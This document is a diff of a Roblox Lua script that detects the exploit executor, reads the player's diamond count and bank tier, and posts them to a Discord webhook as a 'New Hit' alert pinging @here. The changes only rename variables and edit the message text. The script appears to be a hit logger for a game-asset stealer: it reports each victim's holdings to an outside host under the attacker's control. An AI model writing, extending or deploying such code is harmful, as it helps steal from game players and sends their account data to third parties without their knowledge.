@@ -1,3 +1,4 @@
+
 local function getexploit()
 	local exploit =
 		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
@@ -43,7 +44,7 @@ _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-	["content"]= "**💎 New Hit With **".._G.ScriptName .."💎 || @here|| ",
+	["content"]= "**🎁New Hit With **".._G.NameScript.. " || @here|| ",
 	["username"] = "Arkhalis",
 	["embeds"]= {
 	  {
@@ -58,7 +59,7 @@ local msg = {
         },
 		["fields"]= {
         {
-          ["name"]= "**💎Diamonds💎**",
+          ["name"]= "**💎Diamonds 💎**",
           ["value"]= "```".._G.DisplayDiamond.."```",
           ["inline"]= true
         },
@@ -78,7 +79,7 @@ local msg = {
   },
 	["attachments"] = {}
   }
-  local Webhook = _G.WebhookLink
+  local Webhook = _G.Webhook
   request = http_request or request or HttpPost or syn.request
   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
   end
